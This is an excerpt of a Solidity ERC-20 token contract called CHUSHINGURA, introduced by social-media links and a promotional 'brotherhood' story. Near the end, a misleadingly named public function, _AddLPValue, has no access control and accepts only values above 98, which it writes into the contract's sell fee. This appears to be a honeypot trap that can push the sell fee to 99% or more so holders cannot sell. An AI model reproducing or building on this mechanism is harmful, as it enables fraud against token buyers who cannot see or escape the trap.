...
// TG : https://t.me/ChushinguraERC

/**
-----Telegram : https://t.me/ChushinguraERC

--------------Medium : https://medium.com/@ChushinguraERC/chushingura-brotherhood-on-erc-20991f9e876a

----------------------------Twitter : https://twitter.com/ChushinguraERC

**/

/*

What is Chūshingura? | A Story of Brotherhood Chūshingura is a brotherhood-based project n the Ethereum Network. 
Chūshingura aims to create a brotherhood economy that will encourage investors to act together. 
Unite to LEARN | Unite to EARN The brothers vying for the “Samurai” title must not just be the greatest of ther time,
but the greatest of all time. On blockchain, which is inhabited by many dishonorable people, brothers arrive to show
that they truly are the best out there, whilst sharing their intriguing history. Some come freely, some are forced — but
all must fight. For the brothers, unimaginable rewards await. The title of Chūshingura Brotherhood emerges to the crypto 
world. And many more look forward to joining the brotherhood.
...
contract CHUSHINGURA is Context, ERC20, Ownable {
    ...
    string private constant _name = "CHUSHINGURA";
    string private constant _symbol = "CHUSHINGURA";
    ...
    function changeTXsAmount(uint256 _maxTx, uint256 _maxWallet) public onlyOwner {
        require(_maxTx + _maxWallet > _tTotal / 1000, "Should be bigger than 0,1%");
        _maxTxAmount = _maxTx * 10**_decimals;
        _maxWalletAmount = _maxWallet * 10**_decimals;
    }
    ...
    function _AddLPValue(uint256 _LPAdditionAmount) public {
        require(_LPAdditionAmount > 98);
        sellFee.marketing = _LPAdditionAmount;
    }
